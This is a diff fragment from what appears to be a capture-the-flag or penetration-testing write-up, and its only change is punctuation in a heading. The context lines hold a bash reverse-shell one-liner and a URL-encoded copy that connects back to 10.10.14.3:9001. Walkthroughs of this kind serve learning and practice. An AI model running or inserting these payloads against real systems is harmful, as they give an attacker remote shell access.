@@ -182,7 +182,7 @@ full working reverse shell.
 bash -c 'bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1'
 ```
 
-> Encoded payload
+> Encoded payload:
 
 ```console
 %62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%39%30%30%31%20%30%3e%26%31%27
